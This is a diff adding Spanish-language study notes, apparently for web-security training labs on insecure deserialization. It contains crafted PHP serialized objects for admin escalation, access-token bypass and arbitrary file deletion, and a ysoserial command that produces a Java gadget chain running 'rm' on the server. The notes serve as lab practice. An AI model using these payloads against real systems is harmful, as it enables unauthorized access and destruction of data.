@@ -1,3 +1,48 @@
+1. Decodear cookie y cambiar valor booleano a 1
+```php
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+```
+
+2. Decodear cookie y cambiar valores:
+```php
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"xljyz3id9jx3opb91y2gd6gsj1zt0kr1";}
+```
+--> Lo cambiamos a esto:
+```php
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
+```
+(Modificamos el id junto a su longitud, y cambiamos al access token a un booleano en TRUE)
+
+3. Habia ruta a un pfp el cual podemos modificar cambiando su longitug del 's' y borra el archivo que queramos:
+```php
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mvquzwgs2off1203isaxi32z0d5oxb6p";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+```
+
+4. Are there interesting files exposed?
+	1. Intentas leer el backup de vim con  (~)? GET /libs/CustomTemplate.php~
+	2. Creas un objeto custom.
+![[Pasted image 20260727134811.png]]
+```php
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dvt6huggv1p5slintug8zy9s7pjn10c8";}
+```
+--> Crafteamos un objeto nuevo:
+```php
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
+5. Apache Commons:
+	1. Las cookies de Java comienzan por **'rOO...'**
+	2. Descargamos el YSOSERIAL.jar
+	3. Probamos payloads con los distintos CommonsCollections{1,2,3,4}
+```bash
+java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0;
+ echo
+```
+	4. Cuando tenemos el que queremos lo pegamos y copiamos el de arriba para el formato URL-Encode
+
+![[Pasted image 20260727142904.png]]
+
+
 Checklist:
 ```
 1. Decode Cookie
